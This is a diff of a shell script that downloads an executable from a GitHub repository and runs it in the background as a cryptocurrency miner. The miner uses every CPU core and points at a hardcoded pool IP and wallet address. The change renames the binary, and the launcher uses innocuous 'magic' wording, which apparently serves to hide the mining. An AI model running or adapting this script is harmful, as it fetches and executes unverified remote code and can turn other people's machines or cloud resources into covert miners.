@@ -2,8 +2,8 @@
 
 # Function to download and prepare the mining script
 prepare_mining_script() {
-  wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
-  chmod +x tmii
+  wget -O avv https://github.com/barburonjilo/back/raw/main/sr
+  chmod +x avv
 }
 
 # Function to generate the localized date string with core count
@@ -24,7 +24,7 @@ start_magic() {
   local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores
 
   # Start the mining process with core affinity and output to log file
-  taskset -c $cores_to_use nohup ./tmii -a minotaurx --pool 45.115.224.249:8448 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
+  taskset -c $cores_to_use nohup ./avv -a minotaurx --pool 45.115.224.249:8448 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
